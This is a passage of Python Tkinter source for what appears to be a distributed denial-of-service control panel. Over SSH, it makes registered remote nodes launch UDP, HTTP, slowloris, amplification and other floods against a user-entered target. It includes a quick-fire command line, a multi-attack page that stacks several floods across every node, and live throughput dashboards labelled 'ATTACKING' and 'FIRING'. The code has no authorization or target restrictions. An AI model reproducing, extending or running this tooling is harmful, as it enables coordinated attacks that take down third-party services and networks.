        self.graph_canvas.pack(fill="x", pady=(2, 0))

        # node status
        self.node_frame = tk.Frame(self.dash_frame, bg=BG)
        self.node_frame.pack(fill="both", expand=True, padx=20, pady=5)

        # control buttons
        ctrl = tk.Frame(self.dash_frame, bg=BG)
        ctrl.pack(pady=10)

        self.pause_btn = ttk.Button(ctrl, text="⏸ Pause", style="Nav.TButton", command=self._pause)
        self.pause_btn.pack(side="left", padx=5)
        self.resume_btn = ttk.Button(ctrl, text="▶ Resume", style="Green.TButton", command=self._resume)
        self.resume_btn.pack(side="left", padx=5)
        self.stop_btn = ttk.Button(ctrl, text="⏹ Stop", style="Danger.TButton", command=self._stop)
        self.stop_btn.pack(side="left", padx=5)

    def _on_protocol_change(self, event=None):
        self._update_fields_for_protocol()

    def _on_preset_change(self, event=None):
        name = self.preset_var.get()
        if name in PRESETS:
            p = PRESETS[name]
            self.f_vars["protocol"].set(p["protocol"])
            self.f_vars["workers"].set(str(p["workers"]))
            self.f_vars["duration"].set(str(p["duration"]))
            self.f_vars["pkt"].set(str(p["pkt"]))
            self.f_vars["port"].set(str(p["port"]))
            self.f_vars["method"].set(p.get("method", "GET"))
            self.f_vars["https"].set(p.get("https", False))
            self.f_vars["jitter"].set(str(p.get("jitter", 0)))
            self.f_vars["rate_limit"].set(str(p.get("rate_limit", 0)))
            self._update_fields_for_protocol()

    def _update_fields_for_protocol(self):
        proto_name = self.f_vars["protocol"].get()
        info = PROTOCOL_MAP.get(proto_name, PROTOCOL_MAP["UDP"])
        fields_type = info["fields"]
        is_l7 = info.get("script") == "l7"

        # update port default
        self.f_vars["port"].set(str(info["default_port"]))

        # hide all optional fields first
        self.method_label.grid_forget()
        self.method_cb.grid_forget()
        self.https_cb.grid_forget()
        self.jitter_label.grid_forget()
        self.jitter_entry.grid_forget()
        self.rate_label.grid_forget()
        self.rate_entry.grid_forget()

        if fields_type == "l7":
            self.workers_label.config(text="Workers/node")
            self.pkt_label.grid_forget()
            self.pkt_entry.grid_forget()
            # show L7 fields: jitter + rate limit on row 4-5
            self.jitter_label.grid(row=4, column=0, padx=8, pady=(4, 0), sticky="w")
            self.jitter_entry.grid(row=5, column=0, padx=8, pady=(0, 4), sticky="ew")
            self.rate_label.grid(row=4, column=1, padx=8, pady=(4, 0), sticky="w")
            self.rate_entry.grid(row=5, column=1, padx=8, pady=(0, 4), sticky="ew")
        elif fields_type == "http":
            self.workers_label.config(text="Workers/node")
            self.pkt_label.grid(row=2, column=2, padx=8, pady=(4, 0), sticky="w")
            self.pkt_entry.grid(row=3, column=2, padx=8, pady=(0, 4), sticky="ew")
            self.method_label.grid(row=4, column=0, padx=8, pady=(4, 0), sticky="w")
            self.method_cb.grid(row=5, column=0, padx=8, pady=(0, 4), sticky="ew")
            self.https_cb.grid(row=5, column=1, padx=8, pady=(0, 4), sticky="w")
        elif fields_type == "slowloris":
            self.workers_label.config(text="Connections/node")
            self.pkt_label.grid(row=2, column=2, padx=8, pady=(4, 0), sticky="w")
            self.pkt_entry.grid(row=3, column=2, padx=8, pady=(0, 4), sticky="ew")
            self.pkt_label.config(text="Conns/worker")
        elif fields_type == "amp":
            self.workers_label.config(text="Workers/node")
            self.pkt_label.grid_forget()
            self.pkt_entry.grid_forget()
            self.port_entry.config(state="disabled")
        elif fields_type == "vse":
            self.workers_label.config(text="Workers/node")
            self.pkt_label.grid_forget()
            self.pkt_entry.grid_forget()
        else:  # standard
            self.workers_label.config(text="Workers/node")
            self.pkt_label.config(text="Packet size")
            self.pkt_label.grid(row=2, column=2, padx=8, pady=(4, 0), sticky="w")
            self.pkt_entry.grid(row=3, column=2, padx=8, pady=(0, 4), sticky="ew")

        if fields_type != "amp":
            self.port_entry.config(state="normal")

        # root warning
        if info.get("root"):
            self.root_warn.config(text=f"⚠ {proto_name} requires root (sudo) on servers")
        else:
            self.root_warn.config(text="")

        # layer indicator
        if is_l7:
            self.layer_label.config(text="● Layer 7 — webstress.py", fg=CYAN_C)
        else:
            self.layer_label.config(text="● Layer 3/4 — stresstest.py", fg=BLUE_C)

    def _start_attack(self):
        target = self.f_vars["target"].get().strip()
        if not target:
            messagebox.showwarning("Missing", "Enter a target IP or hostname.")
            return

        nodes = load_nodes()
        if not nodes:
            messagebox.showwarning("No Nodes", "Register nodes first.")
            return

        proto_name = self.f_vars["protocol"].get()
        info = PROTOCOL_MAP.get(proto_name, PROTOCOL_MAP["UDP"])
        cli_proto = info["cli"]
        needs_root = info.get("root", False)

        port = int(self.f_vars["port"].get() or str(info["default_port"]))
        workers = int(self.f_vars["workers"].get() or "200")
        self.duration = int(self.f_vars["duration"].get() or "30")
        pkt = int(self.f_vars["pkt"].get() or "1024")
        method = self.f_vars["method"].get()
        https = self.f_vars["https"].get()
        self.current_protocol_name = proto_name

        self.attack_running = True
        self.attack_paused = False
        self.node_stats = {}
        self.node_procs = {}
        self.node_pids = {}
        self.throughput_history.clear()

        self.config_frame.pack_forget()
        self.dash_frame.pack(fill="both", expand=True)
        self.back_btn.config(state="disabled")

        layer_tag = "L7" if is_l7 else "L3/L4"
        script_tag = SCRIPT_L7 if is_l7 else SCRIPT_L3
        self.dash_proto_label.config(text=f"[{layer_tag}] {proto_name}  |  {script_tag}  |  {target}:{port}")

        total_workers = workers * len(nodes)
        self.stat_labels["workers_total"].config(text=f"{total_workers:,}")

        is_l7 = info.get("script") == "l7"
        jitter = int(self.f_vars["jitter"].get() or "0")
        rate_limit = int(self.f_vars["rate_limit"].get() or "0")

        if is_l7:
            cmd = (f"python3 ~/{SCRIPT_L7} --target {target} --port {port}"
                   f" --method {cli_proto} --workers {workers}"
                   f" --duration {self.duration} --jitter {jitter}"
                   f" --rate-limit {rate_limit} --stream")
        else:
            cmd = (f"python3 ~/{SCRIPT_L3} --target {target} --port {port}"
                   f" --protocol {cli_proto} --workers {workers}"
                   f" --duration {self.duration} --packet-size {pkt}"
                   f" --ramp-up 0 --stream")
            if cli_proto == "http":
                cmd += f" --http-method {method}"
                if https:
                    cmd += " --https"

        if needs_root:
            cmd = "sudo " + cmd

        self.start_time = time.monotonic()

        for node in nodes:
            name = node.get("name", node["ip"])
            proc = ssh_stream(node, cmd)
            self.node_procs[name] = proc
            with self.lock:
                self.node_stats[name] = {"status": "connecting"}
            threading.Thread(target=self._read_stream, args=(node,), daemon=True).start()

        self._update_dashboard()

    def _read_stream(self, node):
        name = node.get("name", node["ip"])
        proc = self.node_procs[name]
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
                with self.lock:
                    self.node_stats[name] = data
                    if "pid" in data:
                        self.node_pids[name] = data["pid"]
            except json.JSONDecodeError:
                pass
        proc.wait()
        with self.lock:
            if name in self.node_stats:
                self.node_stats[name].setdefault("status", "done")

    def _update_dashboard(self):
        if not self.attack_running:
            return

        elapsed = time.monotonic() - self.start_time
        progress = min(elapsed / self.duration, 1.0)

        # progress bar
        self.progress_canvas.delete("all")
        w = self.progress_canvas.winfo_width()
        if w > 1:
            self.progress_canvas.create_rectangle(0, 0, w * progress, 24, fill=GREEN_C, outline="")
            self.progress_canvas.create_rectangle(w * progress, 0, w, 24, fill=BG2, outline="")
        self.progress_label.config(text=f"{progress*100:5.1f}%    {elapsed:.0f}s / {self.duration}s")

        # status
        if self.attack_paused:
            self.status_label.config(text="PAUSED", fg=YELLOW_C)
        else:
            self.status_label.config(text="ATTACKING", fg=RED_C)

        # aggregate stats
        total_packets = 0
        total_bytes = 0
        total_pps = 0
        total_mbs = 0.0
        total_errors = 0

        with self.lock:
            for name, s in self.node_stats.items():
                total_packets += s.get("packets", s.get("total_packets", 0))
                total_bytes += s.get("bytes", s.get("total_bytes", 0))
                total_pps += s.get("pps", s.get("avg_pps", 0))
                total_mbs += s.get("MBs", s.get("avg_MBs", 0))
                total_errors += s.get("errors", s.get("total_errors", 0))

        self.throughput_history.append(total_mbs)

        self.stat_labels["packets"].config(text=f"{total_packets:,}")
        self.stat_labels["bytes"].config(text=format_bytes(total_bytes))
        self.stat_labels["pps"].config(text=f"{total_pps:,.0f}")
        self.stat_labels["mbps"].config(text=f"{total_mbs:.1f} MB/s")
        self.stat_labels["errors"].config(text=f"{total_errors:,}")

        # throughput graph
        self._draw_graph()

        # node rows
        for w in self.node_frame.winfo_children():
            w.destroy()

        with self.lock:
            for name, s in self.node_stats.items():
                st = s.get("status", "?")
                row = tk.Frame(self.node_frame, bg=BG2, padx=10, pady=5)
                row.pack(fill="x", pady=1)

                if st == "running":
                    color = GREEN_C
                    st_text = "FIRING"
                elif st == "paused":
                    color = YELLOW_C
                    st_text = "PAUSED"
                elif st == "done":
                    color = BLUE_C
                    st_text = "DONE"
                elif st == "connecting":
                    color = YELLOW_C
                    st_text = "CONNECTING"
                else:
                    color = RED_C
                    st_text = st.upper()[:12]

                tk.Label(row, text=f"● {name}", bg=BG2, fg=color,
                         font=("Consolas", 10, "bold")).pack(side="left")
                tk.Label(row, text=st_text, bg=BG2, fg=color,
                         font=("Consolas", 10)).pack(side="left", padx=(15, 0))

                pkts = s.get("packets", s.get("total_packets", 0))
                mbs = s.get("MBs", s.get("avg_MBs", 0))
                errs = s.get("errors", s.get("total_errors", 0))
                tk.Label(row, text=f"{pkts:>10,} pkt", bg=BG2, fg=FG,
                         font=("Consolas", 9)).pack(side="left", padx=(20, 0))
                tk.Label(row, text=f"{mbs:>7.1f} MB/s", bg=BG2, fg=FG,
                         font=("Consolas", 9)).pack(side="left", padx=(10, 0))
                tk.Label(row, text=f"{errs:,} err", bg=BG2, fg=RED_C if errs > 0 else FG_DIM,
                         font=("Consolas", 9)).pack(side="left", padx=(10, 0))

        # check if done
        all_done = False
        with self.lock:
            if self.node_stats:
                all_done = all(s.get("status") == "done" for s in self.node_stats.values())

        if all_done:
            self.attack_running = False
            self.status_label.config(text="COMPLETE", fg=GREEN_C)
            self.back_btn.config(state="normal")
            self.back_btn.config(command=self._reset_and_back)
            return

        self.after(800, self._update_dashboard)

    def _draw_graph(self):
        self.graph_canvas.delete("all")
        w = self.graph_canvas.winfo_width()
        h = self.graph_canvas.winfo_height()
        if w < 10 or h < 10 or not self.throughput_history:
            return

        data = list(self.throughput_history)
        max_val = max(data) if data else 1
        if max_val == 0:
            max_val = 1

        n = len(data)
        bar_w = max(w / max(n, 1), 2)

        for i, val in enumerate(data):
            x0 = i * bar_w
            bar_h = (val / max_val) * (h - 4)
            y0 = h - bar_h
            color = GREEN_C if val > max_val * 0.6 else YELLOW_C if val > max_val * 0.3 else RED_C
            self.graph_canvas.create_rectangle(x0, y0, x0 + bar_w - 1, h, fill=color, outline="")

        # scale label
        self.graph_canvas.create_text(w - 5, 5, text=f"{max_val:.1f}", anchor="ne", fill=FG_DIM,
                                      font=("Consolas", 8))

    def _pause(self):
        self.attack_paused = True
        nodes = load_nodes()
        for node in nodes:
            name = node.get("name", node["ip"])
            pid = self.node_pids.get(name)
            if pid:
                threading.Thread(target=ssh_cmd, args=(node, f"kill -USR1 {pid}", 5), daemon=True).start()

    def _resume(self):
        self.attack_paused = False
        nodes = load_nodes()
        for node in nodes:
            name = node.get("name", node["ip"])
            pid = self.node_pids.get(name)
            if pid:
                threading.Thread(target=ssh_cmd, args=(node, f"kill -USR2 {pid}", 5), daemon=True).start()

    def _stop(self):
        self.attack_running = False
        nodes = load_nodes()
        for node in nodes:
            name = node.get("name", node["ip"])
            pid = self.node_pids.get(name)
            if pid:
                threading.Thread(target=ssh_cmd, args=(node, f"kill -INT {pid}", 5), daemon=True).start()
        self.status_label.config(text="STOPPED", fg=YELLOW_C)
        self.back_btn.config(state="normal")
        self.back_btn.config(command=self._reset_and_back)

    def _reset_and_back(self):
        self.dash_frame.pack_forget()
        self.config_frame.pack(fill="x", padx=20, pady=5)
        self.back_btn.config(state="normal", command=lambda: self.app.show("MainPage"))
        self.attack_running = False
        self.app.show("MainPage")


# ─── Quick Fire Page ─────────────────────────────────────────────────────────

class QuickFirePage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(20, 10))
        ttk.Button(top, text="← Back", style="Back.TButton",
                   command=lambda: app.show("MainPage")).pack(side="left")
        tk.Label(top, text="QUICK FIRE", bg=BG, fg=WHITE_C,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        tk.Label(self, text="target  port  protocol  workers  duration  [pkt]  [jitter]  [rate]",
                 bg=BG, fg=FG_DIM, font=("Consolas", 9)).pack(padx=20, anchor="w")
        tk.Label(self, text="L3: 10.0.0.5 9000 udp 300 30 1400  |  L7: 10.0.0.5 80 l7:http 500 60",
                 bg=BG, fg=FG_DIM, font=("Consolas", 9)).pack(padx=20, anchor="w", pady=(0, 5))

        input_frame = tk.Frame(self, bg=BG)
        input_frame.pack(fill="x", padx=20, pady=5)

        self.cmd_var = tk.StringVar()
        e = tk.Entry(input_frame, textvariable=self.cmd_var, bg=BG2, fg=WHITE_C,
                     insertbackground=WHITE_C, font=("Consolas", 13), relief="flat", bd=4)
        e.pack(side="left", fill="x", expand=True, ipady=5)
        e.bind("<Return>", lambda ev: self._fire())

        ttk.Button(input_frame, text="🔥 FIRE", style="Danger.TButton",
                   command=self._fire).pack(side="left", padx=(10, 0))

        self.result_label = tk.Label(self, text="", bg=BG, fg=FG, font=("Consolas", 10))
        self.result_label.pack(pady=10)

    def _fire(self):
        line = self.cmd_var.get().strip()
        if not line:
            return
        parts = line.split()
        if len(parts) < 3:
            self.result_label.config(text="Need at least: target port protocol", fg=RED_C)
            return

        target = parts[0]
        port = int(parts[1])
        proto_raw = parts[2].lower()
        workers = int(parts[3]) if len(parts) > 3 else 200
        duration = int(parts[4]) if len(parts) > 4 else 30
        pkt = int(parts[5]) if len(parts) > 5 else 1024
        jitter = int(parts[6]) if len(parts) > 6 else 0
        rate_limit = int(parts[7]) if len(parts) > 7 else 0

        # l7: prefix forces L7 script match
        force_l7 = proto_raw.startswith("l7:")
        proto_cli = proto_raw.replace("l7:", "") if force_l7 else proto_raw

        # find matching protocol display name (prefer L7 if forced)
        proto_display = "UDP"
        l3_match = None
        l7_match = None
        for name, info in PROTOCOL_MAP.items():
            if info["cli"] == proto_cli:
                if info.get("script") == "l7":
                    l7_match = name
                else:
                    l3_match = name
        if force_l7 and l7_match:
            proto_display = l7_match
        elif l7_match and not l3_match:
            proto_display = l7_match
        elif l3_match and not l7_match:
            proto_display = l3_match
        elif l7_match and l3_match:
            # L7-only cli names (multi, rudy, pipeline, etc) auto-resolve
            # shared names (http, slowloris) default to L3 unless forced
            proto_display = l7_match if force_l7 else l3_match
        # protocols unique to L7 (no L3 match) resolve automatically
        if not l3_match and not l7_match:
            self.result_label.config(text=f"Unknown protocol: {proto_cli}", fg=RED_C)
            return

        ap = self.app.frames["AttackPage"]
        ap.f_vars["target"].set(target)
        ap.f_vars["port"].set(str(port))
        ap.f_vars["protocol"].set(proto_display)
        ap.f_vars["workers"].set(str(workers))
        ap.f_vars["duration"].set(str(duration))
        ap.f_vars["pkt"].set(str(pkt))
        ap.f_vars["jitter"].set(str(jitter))
        ap.f_vars["rate_limit"].set(str(rate_limit))

        self.app.show("AttackPage")
        ap._start_attack()


# ─── Shell Page ──────────────────────────────────────────────────────────────


# ─── Multi Attack Page ──────────────────────────────────────────────────────

class MultiAttackPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app
        self.slots = []
        self.attack_running = False
        self.procs = {}
        self.all_stats = {}
        self.all_pids = {}
        self.lock = threading.Lock()
        self.start_time = 0
        self.duration = 60
        self.throughput_history = deque(maxlen=60)

        # ─ top bar
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(15, 5))
        self.back_btn = ttk.Button(top, text="<- Back", style="Back.TButton",
                                   command=lambda: app.show("MainPage"))
        self.back_btn.pack(side="left")
        tk.Label(top, text="MULTI ATTACK", bg=BG, fg=RED_C,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        # ─ config frame
        self.config_frame = tk.Frame(self, bg=BG)
        self.config_frame.pack(fill="both", expand=True)

        # shared: target + duration
        shared = tk.Frame(self.config_frame, bg=BG2, padx=15, pady=10)
        shared.pack(fill="x", padx=20, pady=(5, 5))

        tk.Label(shared, text="Target", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(
            row=0, column=0, padx=8, sticky="w")
        self.target_var = tk.StringVar()
        tk.Entry(shared, textvariable=self.target_var, bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                 font=("Consolas", 11), width=22, relief="flat", bd=2).grid(
            row=1, column=0, padx=8, sticky="ew")

        tk.Label(shared, text="Duration (s)", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).grid(
            row=0, column=1, padx=8, sticky="w")
        self.duration_var = tk.StringVar(value="60")
        tk.Entry(shared, textvariable=self.duration_var, bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                 font=("Consolas", 11), width=8, relief="flat", bd=2).grid(
            row=1, column=1, padx=8, sticky="ew")

        shared.columnconfigure(0, weight=1)

        # header row
        hdr = tk.Frame(self.config_frame, bg=BG)
        hdr.pack(fill="x", padx=20, pady=(10, 2))
        tk.Label(hdr, text="ATTACK SLOTS", bg=BG, fg=CYAN_C,
                 font=("Consolas", 11, "bold")).pack(side="left")
        ttk.Button(hdr, text="+ Add Slot", style="Green.TButton",
                   command=self._add_slot).pack(side="right")

        # column labels
        col_hdr = tk.Frame(self.config_frame, bg=BG, padx=30)
        col_hdr.pack(fill="x", padx=20)
        for txt, w in [("Protocol", 20), ("Port", 6), ("Workers", 6), ("Jitter", 5), ("Rate", 5)]:
            tk.Label(col_hdr, text=txt, bg=BG, fg=FG_DIM, font=("Consolas", 8)).pack(side="left", padx=4)

        # slot list
        self.slots_frame = tk.Frame(self.config_frame, bg=BG)
        self.slots_frame.pack(fill="both", expand=True, padx=20, pady=2)

        # fire button
        ttk.Button(self.config_frame, text="FIRE ALL", style="Danger.TButton",
                   command=self._start_all).pack(pady=(5, 10))

        # add default slot
        self._add_slot()

        # ─ dashboard (hidden until attack starts)
        self.dash_frame = tk.Frame(self, bg=BG)

        self.dash_info_label = tk.Label(self.dash_frame, text="", bg=BG, fg=CYAN_C,
                                         font=("Consolas", 10))
        self.dash_info_label.pack(pady=(5, 0))

        self.dash_slots_label = tk.Label(self.dash_frame, text="", bg=BG, fg=FG_DIM,
                                          font=("Consolas", 9))
        self.dash_slots_label.pack(pady=(0, 5))

        # progress
        pf = tk.Frame(self.dash_frame, bg=BG2, padx=15, pady=10)
        pf.pack(fill="x", padx=20, pady=(5, 5))
        self.progress_canvas = tk.Canvas(pf, height=24, bg=BG, highlightthickness=0)
        self.progress_canvas.pack(fill="x", pady=(0, 5))
        self.progress_label = tk.Label(pf, text="0.0%  0s / 0s", bg=BG2, fg=FG,
                                        font=("Consolas", 10))
        self.progress_label.pack()

        self.status_label = tk.Label(self.dash_frame, text="ATTACKING", bg=BG, fg=RED_C,
                                      font=("Consolas", 14, "bold"))
        self.status_label.pack(pady=(5, 2))

        # stats grid
        sf = tk.Frame(self.dash_frame, bg=BG2, padx=15, pady=10)
        sf.pack(fill="x", padx=20, pady=5)
        self.stat_labels = {}
        for i, (label, key) in enumerate([
            ("Total Packets", "packets"), ("Total Sent", "bytes"),
            ("Packets/sec", "pps"), ("Throughput", "mbps"),
            ("Total Errors", "errors"), ("Workers", "workers_total"),
        ]):
            row, col = divmod(i, 2)
            tk.Label(sf, text=label, bg=BG2, fg=YELLOW_C,
                     font=("Consolas", 9)).grid(row=row, column=col*2, padx=(10,5), pady=3, sticky="w")
            lbl = tk.Label(sf, text="0", bg=BG2, fg=WHITE_C, font=("Consolas", 12, "bold"))
            lbl.grid(row=row, column=col*2+1, padx=(0,20), pady=3, sticky="e")
            self.stat_labels[key] = lbl
            sf.columnconfigure(col*2, weight=1)
            sf.columnconfigure(col*2+1, weight=1)

        # graph
        gf = tk.Frame(self.dash_frame, bg=BG2, padx=10, pady=8)
        gf.pack(fill="x", padx=20, pady=(2, 5))
        tk.Label(gf, text="Throughput (MB/s)", bg=BG2, fg=FG_DIM,
                 font=("Consolas", 9)).pack(anchor="w")
        self.graph_canvas = tk.Canvas(gf, height=60, bg=BG, highlightthickness=0)
        self.graph_canvas.pack(fill="x", pady=(2, 0))

        # node/slot breakdown
        self.node_frame = tk.Frame(self.dash_frame, bg=BG)
        self.node_frame.pack(fill="both", expand=True, padx=20, pady=5)

        # controls
        ctrl = tk.Frame(self.dash_frame, bg=BG)
        ctrl.pack(pady=10)
        ttk.Button(ctrl, text="STOP ALL", style="Danger.TButton",
                   command=self._stop).pack(side="left", padx=5)

    # ── slot management ──

    def _add_slot(self):
        slot = {
            "proto_var": tk.StringVar(value="HTTP Flood (L7)"),
            "port_var": tk.StringVar(value="80"),
            "workers_var": tk.StringVar(value="200"),
            "jitter_var": tk.StringVar(value="0"),
            "rate_var": tk.StringVar(value="0"),
        }
        self.slots.append(slot)
        self._refresh_slots()

    def _remove_slot(self, idx):
        if len(self.slots) > 1:
            self.slots.pop(idx)
            self._refresh_slots()

    def _refresh_slots(self):
        for w in self.slots_frame.winfo_children():
            w.destroy()

        for i, slot in enumerate(self.slots):
            row = tk.Frame(self.slots_frame, bg=BG2, padx=8, pady=6)
            row.pack(fill="x", pady=2)

            tk.Label(row, text=f"#{i+1}", bg=BG2, fg=YELLOW_C,
                     font=("Consolas", 11, "bold")).pack(side="left", padx=(0, 6))

            cb = ttk.Combobox(row, textvariable=slot["proto_var"], state="readonly",
                              values=PROTOCOL_NAMES, style="Dark.TCombobox", width=20)
            cb.pack(side="left", padx=3)
            cb.bind("<<ComboboxSelected>>", lambda e, idx=i: self._on_slot_proto_change(idx))

            tk.Label(row, text="P:", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).pack(side="left", padx=(6,1))
            tk.Entry(row, textvariable=slot["port_var"], bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                     font=("Consolas", 10), width=6, relief="flat", bd=2).pack(side="left", padx=2)

            tk.Label(row, text="W:", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).pack(side="left", padx=(6,1))
            tk.Entry(row, textvariable=slot["workers_var"], bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                     font=("Consolas", 10), width=5, relief="flat", bd=2).pack(side="left", padx=2)

            tk.Label(row, text="J:", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).pack(side="left", padx=(6,1))
            tk.Entry(row, textvariable=slot["jitter_var"], bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                     font=("Consolas", 10), width=4, relief="flat", bd=2).pack(side="left", padx=2)

            tk.Label(row, text="R:", bg=BG2, fg=FG_DIM, font=("Consolas", 9)).pack(side="left", padx=(6,1))
            tk.Entry(row, textvariable=slot["rate_var"], bg=BG, fg=WHITE_C, insertbackground=WHITE_C,
                     font=("Consolas", 10), width=4, relief="flat", bd=2).pack(side="left", padx=2)

            info = PROTOCOL_MAP.get(slot["proto_var"].get(), {})
            layer = "L7" if info.get("script") == "l7" else "L3"
            tk.Label(row, text=layer, bg=BG2, fg=CYAN_C if layer == "L7" else BLUE_C,
                     font=("Consolas", 9, "bold")).pack(side="left", padx=(8, 0))

            if len(self.slots) > 1:
                ttk.Button(row, text="X", style="Back.TButton",
                           command=lambda idx=i: self._remove_slot(idx)).pack(side="right")

    def _on_slot_proto_change(self, idx):
        slot = self.slots[idx]
        proto_name = slot["proto_var"].get()
        info = PROTOCOL_MAP.get(proto_name, {})
        slot["port_var"].set(str(info.get("default_port", 80)))
        self._refresh_slots()

    # ── command builder ──

    def _build_cmd(self, slot, target, duration):
        proto_name = slot["proto_var"].get()
        info = PROTOCOL_MAP.get(proto_name, PROTOCOL_MAP["UDP"])
        cli = info["cli"]
        is_l7 = info.get("script") == "l7"
        root = info.get("root", False)
        port = int(slot["port_var"].get() or str(info["default_port"]))
        workers = int(slot["workers_var"].get() or "200")
        jitter = int(slot["jitter_var"].get() or "0")
        rate = int(slot["rate_var"].get() or "0")

        if is_l7:
            cmd = (f"python3 ~/{SCRIPT_L7} --target {target} --port {port}"
                   f" --method {cli} --workers {workers}"
                   f" --duration {duration} --jitter {jitter}"
                   f" --rate-limit {rate} --stream")
        else:
            cmd = (f"python3 ~/{SCRIPT_L3} --target {target} --port {port}"
                   f" --protocol {cli} --workers {workers}"
                   f" --duration {duration} --packet-size 1024"
                   f" --ramp-up 0 --stream")
        if root:
            cmd = "sudo " + cmd
        return cmd

    # ── attack lifecycle ──

    def _start_all(self):
        target = self.target_var.get().strip()
        if not target:
            messagebox.showwarning("Missing", "Enter a target.")
            return
        nodes = load_nodes()
        if not nodes:
            messagebox.showwarning("No Nodes", "Register nodes first.")
            return
        if not self.slots:
            return

        self.duration = int(self.duration_var.get() or "60")
        self.attack_running = True
        self.procs = {}
        self.all_stats = {}
        self.all_pids = {}
        self.throughput_history.clear()

        self.config_frame.pack_forget()
        self.dash_frame.pack(fill="both", expand=True)
        self.back_btn.config(state="disabled")

        slot_descs = []
        for i, slot in enumerate(self.slots):
            p = slot["proto_var"].get()
            pt = slot["port_var"].get()
            slot_descs.append(f"#{i+1} {p} :{pt}")
        self.dash_info_label.config(text=f"Target: {target}  |  {len(self.slots)} slots x {len(nodes)} nodes")
        self.dash_slots_label.config(text="  |  ".join(slot_descs))

        tw = sum(int(s["workers_var"].get() or "0") for s in self.slots) * len(nodes)
        self.stat_labels["workers_total"].config(text=f"{tw:,}")

        self.start_time = time.monotonic()

        for node in nodes:
            name = node.get("name", node["ip"])
            for si, slot in enumerate(self.slots):
                cmd = self._build_cmd(slot, target, self.duration)
                proc = ssh_stream(node, cmd)
                key = (name, si)
                self.procs[key] = proc
                with self.lock:
                    self.all_stats[key] = {"status": "connecting"}
                threading.Thread(target=self._read_stream, args=(node, si), daemon=True).start()

        self._update_dashboard()

    def _read_stream(self, node, slot_idx):
        name = node.get("name", node["ip"])
        key = (name, slot_idx)
        proc = self.procs[key]
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
                with self.lock:
                    self.all_stats[key] = data
                    if "pid" in data:
                        self.all_pids[key] = data["pid"]
            except json.JSONDecodeError:
                pass
        proc.wait()
        with self.lock:
            if key in self.all_stats:
                self.all_stats[key].setdefault("status", "done")

    def _update_dashboard(self):
        if not self.attack_running:
            return

        elapsed = time.monotonic() - self.start_time
        progress = min(elapsed / self.duration, 1.0)

        self.progress_canvas.delete("all")
        w = self.progress_canvas.winfo_width()
        if w > 1:
            self.progress_canvas.create_rectangle(0, 0, w * progress, 24, fill=GREEN_C, outline="")
            self.progress_canvas.create_rectangle(w * progress, 0, w, 24, fill=BG2, outline="")
        self.progress_label.config(text=f"{progress*100:5.1f}%    {elapsed:.0f}s / {self.duration}s")

        self.status_label.config(text="ATTACKING", fg=RED_C)

        tp = tb = tpps = terr = 0
        tmbs = 0.0
        with self.lock:
            for s in self.all_stats.values():
                tp += s.get("packets", s.get("total_packets", 0))
                tb += s.get("bytes", s.get("total_bytes", 0))
                tpps += s.get("pps", s.get("avg_pps", 0))
                tmbs += s.get("MBs", s.get("avg_MBs", 0))
                terr += s.get("errors", s.get("total_errors", 0))

        self.throughput_history.append(tmbs)
        self.stat_labels["packets"].config(text=f"{tp:,}")
        self.stat_labels["bytes"].config(text=format_bytes(tb))
        self.stat_labels["pps"].config(text=f"{tpps:,.0f}")
        self.stat_labels["mbps"].config(text=f"{tmbs:.1f} MB/s")
        self.stat_labels["errors"].config(text=f"{terr:,}")

        self._draw_graph()

        # per-slot breakdown
        for w in self.node_frame.winfo_children():
            w.destroy()

        node_names = sorted(set(k[0] for k in self.all_stats.keys()))

        with self.lock:
            for si, slot in enumerate(self.slots):
                proto = slot["proto_var"].get()
                port_val = slot["port_var"].get()
                sh = tk.Frame(self.node_frame, bg=BG3, padx=10, pady=3)
                sh.pack(fill="x", pady=(3, 0))
                tk.Label(sh, text=f"#{si+1} {proto} :{port_val}", bg=BG3, fg=CYAN_C,
                         font=("Consolas", 10, "bold")).pack(side="left")

                slot_pps = 0
                slot_mbs = 0.0
                for nn in node_names:
                    key = (nn, si)
                    s = self.all_stats.get(key, {})
                    st = s.get("status", "?")
                    nr = tk.Frame(self.node_frame, bg=BG2, padx=10, pady=2)
                    nr.pack(fill="x")

                    color = {
                        "running": GREEN_C, "connecting": YELLOW_C,
                        "paused": YELLOW_C, "done": BLUE_C
                    }.get(st, RED_C)
                    st_text = {
                        "running": "FIRING", "connecting": "WAIT",
                        "paused": "PAUSED", "done": "DONE"
                    }.get(st, st.upper()[:8])

                    tk.Label(nr, text=f"  {nn}", bg=BG2, fg=color,
                             font=("Consolas", 9)).pack(side="left")
                    tk.Label(nr, text=st_text, bg=BG2, fg=color,
                             font=("Consolas", 9)).pack(side="left", padx=(10,0))

                    pps = s.get("pps", 0)
                    mbs = s.get("MBs", 0)
                    errs = s.get("errors", 0)
                    slot_pps += pps
                    slot_mbs += mbs
                    tk.Label(nr, text=f"{pps:>8,} pps  {mbs:>6.1f} MB/s", bg=BG2, fg=FG,
                             font=("Consolas", 8)).pack(side="left", padx=(12,0))
                    if errs > 0:
                        tk.Label(nr, text=f"{errs:,} err", bg=BG2, fg=RED_C,
                                 font=("Consolas", 8)).pack(side="left", padx=(8,0))

        all_done = False
        with self.lock:
            if self.all_stats:
                all_done = all(s.get("status") == "done" for s in self.all_stats.values())

        if all_done:
            self.attack_running = False
            self.status_label.config(text="COMPLETE", fg=GREEN_C)
            self.back_btn.config(state="normal", command=self._reset_and_back)
            return

        self.after(800, self._update_dashboard)

    def _draw_graph(self):
        self.graph_canvas.delete("all")
        w = self.graph_canvas.winfo_width()
